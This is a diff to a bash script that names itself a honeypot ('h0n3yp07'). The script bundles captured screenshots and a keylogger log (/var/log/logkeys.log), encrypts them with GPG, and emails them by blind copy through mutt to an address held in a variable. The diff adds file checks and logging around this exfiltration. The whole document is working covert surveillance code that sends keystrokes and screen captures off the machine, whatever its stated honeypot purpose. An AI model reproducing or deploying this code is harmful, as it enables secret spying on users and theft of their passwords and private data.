@@ -19,8 +19,12 @@ function send_darth_maul_to_take_some_photos {
 	echo "$(date)> maul: hide your kids, hide your wives" >> /var/log/tarspoon/tarspoon.log
 
 	cd ${PHOTO_PACKAGE_ROOT}/..
-	tar -czf maul.tgz package/ >/dev/null 
-	rm package/* 
+	rm maul.tgz
+	[ "$(ls -A ./package)" ] && \
+		echo "$(date)> maul: packing photos" >> /var/log/tarspoon/tarspoon.log && \
+		tar -czf maul.tgz package/ && \
+		rm package/* || \
+		echo "$(date)> maul: nothing to pack" >> /var/log/tarspoon/tarspoon.log && \
 	cd -	
 
 	for tt in {0..4} ; do
@@ -33,10 +37,17 @@ function call_home {
 	echo "$(date)> call: returning the favor" >> /var/log/tarspoon/tarspoon.log
 
 	rm /root/*gpg 
-	gpg -eo /root/maul.gpg -r "$NAME" ${PHOTO_PACKAGE_ROOT}/../maul.tgz
-	gpg -eo /root/keys.gpg -r "$NAME" /var/log/logkeys.log
-	echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/maul.gpg -s "${STATUS} M4UL $(date)" -b "$MAIL"
-	echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/keys.gpg -s "${STATUS} K3YZ $(date)" -b "$MAIL"
+	if [[ -f ${PHOTO_PACKAGE_ROOT}/../maul.tgz ]]; then
+		echo "$(date)> call: found juicy screenshots" >> /var/log/tarspoon/tarspoon.log
+		gpg -eo /root/maul.gpg -r "$NAME" ${PHOTO_PACKAGE_ROOT}/../maul.tgz
+		echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/maul.gpg -s "${STATUS} M4UL $(date)" -b "$MAIL"
+	fi
+
+	if [[ -f /var/log/logkeys.log ]]; then
+		echo "$(date)> call: found some keypresses" >> /var/log/tarspoon/tarspoon.log
+		gpg -eo /root/keys.gpg -r "$NAME" /var/log/logkeys.log
+		echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/keys.gpg -s "${STATUS} K3YZ $(date)" -b "$MAIL"
+	fi
 }
 
 function rocket {
@@ -62,10 +73,9 @@ function rocket {
 
 # Prepare environment here
 mkdir -p $PHOTO_PACKAGE_ROOT
-chown -R guest $PHOTO_PACKAGE_ROOT
+chown -R $L_USER $PHOTO_PACKAGE_ROOT
 chgrp -R users $PHOTO_PACKAGE_ROOT
 chmod -R go+rw $PHOTO_PACKAGE_ROOT
-send_darth_maul_to_take_some_photos
 
 echo "$(date)> booted up $(cat /etc/hostname)" >> /var/log/tarspoon/tarspoon.log
 while true; do
